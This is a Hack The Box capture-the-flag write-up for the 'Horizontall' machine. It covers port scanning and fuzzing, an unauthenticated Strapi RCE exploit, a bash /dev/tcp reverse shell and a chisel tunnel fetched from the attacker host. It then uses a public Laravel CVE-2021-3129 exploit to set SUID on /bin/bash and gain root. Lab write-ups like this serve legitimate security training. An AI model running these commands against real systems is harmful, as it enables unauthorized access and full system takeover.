+++
title = "HTB: Horizontall"
date = "2022-07-04T21:26:44-05:00"
author = "l0gan334"
authorTwitter = "" #do not include @
cover = "Horizontall.png"
tags = ["hacking", "ctf", "eJPT-like", "HTB", "linux"]
keywords = ["", ""]
description = "**HTB | Horizontall - Write up**"
showFullContent = false
readingTime = false
hideComments = false
+++


**Horizontall** is a **Hack The Box** machine where we will exploit **two web frameworks**. First, an instance of a vulnerable version of **Strapi**, and once inside the victim machine we will find a vulnerable version of **Laravel** running locally that we are going to exploit to get command execution as **root**.

# **```Recon```**
# Nmap

As always, we are going to start by enumerating ports with **nmap**:
```bash
❯ nmap -p- -sS --min-rate 5000 --open -v -n -Pn 10.129.78.41 -oG allPorts

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 20:49 -05
Initiating SYN Stealth Scan at 20:49
Scanning 10.129.78.41 [65535 ports]
Discovered open port 80/tcp on 10.129.78.41
Discovered open port 22/tcp on 10.129.78.41
Completed SYN Stealth Scan at 20:50, 25.98s elapsed (65535 total ports)
Nmap scan report for 10.129.78.41
Host is up (0.16s latency).
Not shown: 62106 filtered tcp ports (no-response), 3427 closed tcp ports (reset)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 26.08 seconds
           Raw packets sent: 128532 (5.655MB) | Rcvd: 3935 (157.408KB)
```


We are exporting the result in grepable format, which is great to manage with regex and get all the ports without needing to type them one by one:

{{< code language="bash" title="Here you have an useful function you can use for this manner" id="1" expand="Show" collapse="Hide" isCollapsed="false" >}}
extractPorts () {
	ports="$(cat $1 | grep -oP '\d{1,5}/open' | awk '{print $1}' FS='/' | xargs | tr ' ' ',')"
	ip_address="$(cat $1 | grep initiated | awk 'NF{print $NF}')"
	echo -e "\n[*] Extracting information...\n" > extractPorts.tmp
	echo -e "\t[*] IP Address: $ip_address" >> extractPorts.tmp
	echo -e "\t[*] Open ports: $ports\n" >> extractPorts.tmp
	echo $ports | tr -d '\n' | xclip -sel clip
	echo -e "[*] Ports copied to clipboard\n" >> extractPorts.tmp
	/bin/batcat extractPorts.tmp
	rm extractPorts.tmp
}
{{< /code >}}
```bash
❯ extractPorts allPorts

[*] Extracting information...

	[*] IP Address: 10.129.78.41
	[*] Open ports: 22,80

[*] Ports copied to clipboard
```

Now we can examinate these ports deeply:
```bash
❯ nmap -sCV -p 22,80 10.129.78.41 -oN targeted

Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-04 20:52 -05
Nmap scan report for 10.129.78.41
Host is up (0.16s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 ee:77:41:43:d4:82:bd:3e:6e:6e:50:cd:ff:6b:0d:d5 (RSA)
|   256 3a:d5:89:d5:da:95:59:d9:df:01:68:37:ca:d5:10:b0 (ECDSA)
|_  256 4a:00:04:b4:9d:29:e7:af:37:16:1b:4f:80:2d:98:94 (ED25519)
80/tcp open  http    nginx 1.14.0 (Ubuntu)
|_http-title: Did not follow redirect to http://horizontall.htb
|_http-server-header: nginx/1.14.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.91 seconds
```

In the nmap scan we see that the website redirects to **horizontall.htb**, so for our machine to recognize this domain we add it to **/etc/hosts**:

```bash
127.0.0.1	localhost
127.0.1.1	h4ckn3t

10.129.78.41    horizontall.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

We can make a quick test with a **ping**:
```bash
❯ ping -c 1 horizontall.htb

PING horizontall.htb (10.129.78.41) 56(84) bytes of data.
64 bytes from horizontall.htb (10.129.78.41): icmp_seq=1 ttl=63 time=172 ms

--- horizontall.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 172.200/172.200/172.200/0.000 ms
```

Now we can visit the website:
{{< image src="/img/hor-1.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

It doesn't look very interesting, quite static. In the bottom we find a contact section but it doesn't seem to work either:

{{< image src="/img/hor-2.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}


Maybe in the source code we can find something:
{{< image src="/img/hor-13.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

There is a **/js/** folder containing some scripts. The most interesting one is the one about an app:
{{< image src="/img/hor-3.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}
{{< image src="/img/hor-5.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

I don't know about you but that doesn't look so clear to me lol. However we can still get some information out of this looking for **keywords**:
```bash
curl -s -X GET 'http://horizontall.htb/js/app.c68eb462.js/' | grep horizontall
```

{{< image src="/img/hor-6.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

We find a subdomain, that we are also going to add to **/etc/hosts** before visiting it:

```bash
127.0.0.1	localhost
127.0.1.1	h4ckn3t

10.129.78.41    horizontall.htb api-prod.horizontall.htb

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
```

{{< image src="/img/hor-7.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

It's not so much better that what we already have but it's something.

Now we can start **fuzzing** this website with **wfuzz**:
```bash
❯ wfuzz -c --hc=404 -t 200 -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt http://api-prod.horizontall.htb/FUZZ

 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. 
 Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://api-prod.horizontall.htb/FUZZ
Total requests: 220547

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000246:   200        16 L     101 W      854 Ch      "admin"
000000189:   403        0 L      1 W        60 Ch       "users"
000000124:   200        0 L      21 W       507 Ch      "reviews"
000001596:   200        0 L      21 W       507 Ch      "Reviews"
```

We see an **/admin** which will lead us to an instance of **Strapi**:

{{< image src="/img/hor-8.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

# **```Foothold```**

We don't have any credentials so we might aswell just start looking for vulnerabilities:
```bash
❯ searchsploit strapi
--------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                 |  Path
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Strapi 3.0.0-beta - Set Password (Unauthenticated)                                                             | multiple/webapps/50237.py
Strapi 3.0.0-beta.17.7 - Remote Code Execution (RCE) (Authenticated)                                           | multiple/webapps/50238.py
Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)                                     | multiple/webapps/50239.py
Strapi CMS 3.0.0-beta.17.4 - Set Password (Unauthenticated) (Metasploit)                                       | nodejs/webapps/50716.rb
--------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
```

With **searchsploit** we find some exploits for version **3.0.0-beta.17.4**, we don't know what version the server is running but we can still try to execute it:
```bash
❯ searchsploit -m multiple/webapps/50239.py

  Exploit: Strapi CMS 3.0.0-beta.17.4 - Remote Code Execution (RCE) (Unauthenticated)
      URL: https://www.exploit-db.com/exploits/50239
     Path: /usr/share/exploitdb/exploits/multiple/webapps/50239.py
File Type: Python script, ASCII text executable

Copied to: /home/logan/Desktop/HTB/Horizontall/exploits/50239.py


❯ python3 50239.py http://api-prod.horizontall.htb/

[+] Checking Strapi CMS Version running
[+] Seems like the exploit will work!!!
[+] Executing exploit


[+] Password reset was successfully
[+] Your email is: admin@horizontall.htb
[+] Your new credentials are: admin:SuperStrongPassword1
[+] Your authenticated JSON Web Token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6MywiaXNBZG1pbiI6dHJ1ZSwiaWF0IjoxNjU2OTkxMDU2LCJleHAiOjE2NTk1ODMwNTZ9.
tquNtqIOdAa4nG2waej0nJW16a39-u-PvemqtFz9Dkg


$> whoami
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
```

It looks like it's working. However, the **RCE** is **blind**. But we can test it with a **ping**:
```bash
$> ping -c 1 10.10.14.161
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output
{"statusCode":400,"error":"Bad Request","message":[{"messages":[{"id":"An error occurred"}]}]}
$>

----------------------------------------------------------------------------------------------

❯ sudo tcpdump -i tun0 icmp -n
[sudo] password for logan:
tcpdump: verbose output suppressed, use -v[v]... for full protocol decode
listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
22:21:21.554375 IP 10.129.78.41 > 10.10.14.161: ICMP echo request, id 4150, seq 1, length 64
22:21:21.554468 IP 10.10.14.161 > 10.129.78.41: ICMP echo reply, id 4150, seq 1, length 64
```

It works!

Now we can get a **reverse shell** with **bash**:
```bash
$> bash -c 'bash -i >& /dev/tcp/10.10.14.161/334 0>&1'
[+] Triggering Remote code executin
[*] Rember this is a blind RCE don't expect to see output

----------------------------------------------------------------------------------------------

❯ nc -lvnp 334
Ncat: Version 7.92 ( https://nmap.org/ncat )
Ncat: Listening on :::334
Ncat: Listening on 0.0.0.0:334
Ncat: Connection from 10.129.78.41.
Ncat: Connection from 10.129.78.41:33632.
bash: cannot set terminal process group (2039): Inappropriate ioctl for device
bash: no job control in this shell
strapi@horizontall:~/myapi$
```

We have a shell but not a **tty** so we will do a **tty treatment**:
```bash
strapi@horizontall:/var/www/html$ script /dev/null -c bash
script /dev/null -c bash
Script started, output log file is '/dev/null'.
strapi@horizontall:~/myapi$ ^Z
zsh: suspended  nc -lvnp 334

❯ stty raw -echo; fg
[1]  + continued  nc -lvnp 334
                              reset
reset: unknown terminal type unknown
Terminal type? xterm
```

And finally the last touches:
```bash
strapi@horizontall:~/myapi$ export TERM=xterm
strapi@horizontall:~/myapi$ export SHELL=bash
strapi@horizontall:~/myapi$ stty rows 40 columns 140
```

This way we will have the correct screen size (you can find your own with ```stty size```) and we are also able to do ^L.


Now that we have everything set we look for the **user flag**:

```bash
strapi@horizontall:/home$ ls
developer
strapi@horizontall:/home$ cd developer
strapi@horizontall:/home/developer$ ls
composer-setup.php  myproject  user.txt
strapi@horizontall:/home/developer$ cat user.txt
dfd6c9d44946c8d*****************
```

Perfect, the first part is done now let's move on.

# **```Privilege escalation```**

We have already listed the ports open publicly, but there are possibly ports open locally:
```bash
strapi@horizontall:/home/developer$ netstat -nat
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:1337          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8000          0.0.0.0:*               LISTEN
tcp        0    138 10.129.78.41:33632      10.10.14.161:334        ESTABLISHED
tcp6       0      0 :::80                   :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
```

Port 8000 is opened with a web server, with curl we can take a look:
{{< image src="/img/hor-9.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

It's running **Laravel**, with **chisel** we will forward this port to us so we can try to exploit it:

```bash
strapi@horizontall:/tmp$ wget http://10.10.14.161/chisel
--2022-07-05 03:58:09--  http://10.10.14.161/chisel
Connecting to 10.10.14.161:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 3107968 (3.0M) [application/octet-stream]
Saving to: ‘chisel’

chisel                             100%[================================================================>]   2.96M  1.30MB/s    in 2.3s

2022-07-05 03:58:11 (1.30 MB/s) - ‘chisel’ saved [3107968/3107968]

strapi@horizontall:/tmp$ chmod +x chisel
```

Chisel works by setting a server locally and a client inside the victim machine:
```bash
strapi@horizontall:/tmp$ ./chisel client 10.10.14.161:1234 R:8000:127.0.0.1:8000
2022/07/05 04:00:38 client: Connecting to ws://10.10.14.161:1234
2022/07/05 04:00:40 client: Connected (Latency 175.182821ms)

----------------------------------------------------------------------------------------------

./chisel server --reverse -p 1234
2022/07/04 23:00:37 server: Reverse tunnelling enabled
2022/07/04 23:00:37 server: Fingerprint WvE59VJMFW9UMU8b/bKA12YM2IvcvIrAmW0phLHL33M=
2022/07/04 23:00:37 server: Listening on http://0.0.0.0:1234
2022/07/04 23:00:40 server: session#1: tun: proxy#R:8000=>8000: Listening
```

Now we can access this port from our **localhost**:
{{< image src="/img/hor-10.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

We have the version of the server, so we can look for exploits:
{{< image src="/img/hor-11.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

We find this one, so we will clone it:
```bash
❯ git clone https://github.com/nth347/CVE-2021-3129_exploit
Cloning into 'CVE-2021-3129_exploit'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (8/8), done.
remote: Total 9 (delta 1), reused 3 (delta 0), pack-reused 0
Receiving objects: 100% (9/9), done.
Resolving deltas: 100% (1/1), done.
```

It's usage is pretty straightforward:
{{< image src="/img/hor-12.png" alt="Hello Friend" position="center" style="border-radius: 8px;" >}}

```bash
❯ ./exploit.py http://localhost:8000 Monolog/RCE1 id
[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[+] PHAR deserialized. Exploited

uid=0(root) gid=0(root) groups=0(root)

[i] Trying to clear logs
[+] Logs cleared
```

And it works!

We have command execution as **root**, in order to get a shell we can change the permissions of the **bash** inside the victim machine so it's **SUID**:
```bash
❯ ./exploit.py http://localhost:8000 Monolog/RCE1 "chmod u+s /bin/bash"

[i] Trying to clear logs
[+] Logs cleared
[+] PHPGGC found. Generating payload and deploy it to the target
[+] Successfully converted logs to PHAR
[i] There is no output
[i] Trying to clear logs
[+] Logs cleared
```
Now if everything goes right we will be able to execute the bash as **root** with the parameter **-p**.
```bash
strapi@horizontall:/tmp$ ls -l /bin/bash
-rwsr-xr-x 1 root root 1113504 Jun  6  2019 /bin/bash
strapi@horizontall:/tmp$ bash -p

bash-4.4# whoami
root
```

And just like this we have successfully owned the victim machine:
```bash
bash-4.4# cat /root/root.txt
803f1bb9a4f911ce****************
```

See you next time!